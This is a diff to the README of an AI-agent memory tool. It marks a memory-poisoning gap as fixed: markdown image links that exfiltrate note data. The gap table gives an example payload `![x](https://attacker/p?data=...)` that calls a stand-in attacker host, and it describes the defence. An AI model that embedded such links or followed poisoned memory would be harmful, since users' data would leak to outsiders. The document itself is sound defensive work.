@@ -422,7 +422,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./docs/replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because OneMemory lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed; **one is open**: the memory-poisoning suite found that markdown image/link data-exfiltration payloads are not flagged (`GAP-POISON-MDLINK`).
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **None is open.**
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -431,7 +431,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from OneMemory. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
-| `GAP-POISON-MDLINK` | The write-time linter does not flag markdown images/links whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note is stored as ordinary memory. | **Open (roadmap)**: add an injection-category pattern for off-allowlist markdown image/link URLs carrying note-derived data. The read-side untrusted-data banner still warns the agent, so this is defense-in-depth. | E11 (fails on purpose) |
+| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
 
 ## Security in one paragraph
 
